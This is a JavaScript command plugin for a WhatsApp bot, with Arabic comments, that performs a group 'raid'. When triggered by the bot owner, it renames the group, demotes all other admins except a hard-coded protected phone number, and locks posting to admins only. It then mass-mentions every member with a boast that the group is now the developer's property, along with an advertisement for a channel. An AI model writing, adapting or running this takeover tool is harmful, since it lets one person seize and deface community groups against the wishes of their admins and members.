// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ⚡ أمر الزرف — ESM 
//  👑 المطور: 𝕴𝖈𝖍𝖎𝖒𝖆𝖗𝖚 
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import { generateWAMessageFromContent } from '@whiskeysockets/baileys'

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

// إعداداتك الخاصة
const CHANNEL_URL = 'https://whatsapp.com/channel/0029Vb82y3ILNSa9GqerHY0f'
const DEV_NAME = '𝕴𝖈𝖍𝖎𝖒𝖆𝖗𝖚'
const GROUP_NAME = 'ملكية ايتشيمارو 🔥'

// الأرقام المحمية (حط رقمك هنا بدون +)
const protectedNumbers = [
    '8615563359887', 
]

let handler = async (m, { conn, isROwner, participants }) => {
    const groupJid = m.chat
    const sender = m.sender
    const senderNumber = sender.split('@')[0]

    if (!groupJid.endsWith('@g.us')) return m.reply('❗ هذا الأمر يعمل فقط داخل المجموعات.')
    
    // فحص الصلاحية (المطور فقط)
    if (!isROwner && !protectedNumbers.includes(senderNumber)) {
        return m.reply('❗ لا تملك صلاحية استخدام هذا الأمر.')
    }

    // 1️⃣ رياكشن البداية
    await conn.sendMessage(groupJid, { react: { text: '😈', key: m.key } }).catch(() => {})
    await sleep(1000)

    // 2️⃣ تغيير اسم المجموعة
    await conn.groupUpdateSubject(groupJid, GROUP_NAME).catch(() => {})

    // 3️⃣ تنزيل الأدمن (ما عدا البوت والمحميين)
    const groupMetadata = await conn.groupMetadata(groupJid)
    const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'
    
    const adminsToDemote = groupMetadata.participants
        .filter(p => p.admin && p.id !== botNumber && !protectedNumbers.includes(p.id.split('@')[0]))
        .map(p => p.id)

    if (adminsToDemote.length > 0) {
        await conn.groupParticipantsUpdate(groupJid, adminsToDemote, 'demote').catch(() => {})
        await sleep(800)
    }

    // 4️⃣ إغلاق المجموعة (للمشرفين فقط)
    await conn.groupSettingUpdate(groupJid, 'announcement').catch(() => {})

    // 5️⃣ المنشن الوهمي والرسالة القوية
    const users = participants.map(u => conn.decodeJid(u.id))
    
    const zarfText = `╔══════════════════════════════╗
║        🔥 *بقيتوا ملكيتي* 🔥        ║
╠══════════════════════════════╣
║
║  😈 *الجروب ده تم دعسه بنجاح!*
║
║  👑 *المطور:* ${DEV_NAME}
║
╠══════════════════════════════╣
║  📢 *عايز تعرف كيف بقت ملكيتي؟*
║  👇 *اشترك في قناتي هنا:*
║  ${CHANNEL_URL}
║
╚══════════════════════════════╝`

    let msg = generateWAMessageFromContent(groupJid, {
        extendedTextMessage: {
            text: zarfText,
            mentions: users,
            contextInfo: {
                mentionedJid: users,
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: `⚡ Powered by ${DEV_NAME}`,
                    body: `تم السيطرة على المجموعة`,
                    thumbnailUrl: `https://telegra.ph/file/086111f67f33d02636a04.jpg`, 
                    sourceUrl: CHANNEL_URL,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }
    }, { quoted: m })

    await conn.relayMessage(groupJid, msg.message, { messageId: msg.key.id })
    
    // رياكشن النهاية
    await conn.sendMessage(groupJid, { react: { text: '✅', key: m.key } }).catch(() => {})
}

handler.help = ['زرف']
handler.tags = ['owner']
handler.command = /^(زرف|zarf|زرف_الجروب)$/i
handler.group = true
handler.rowner = true
handler.botAdmin = true

export default handler
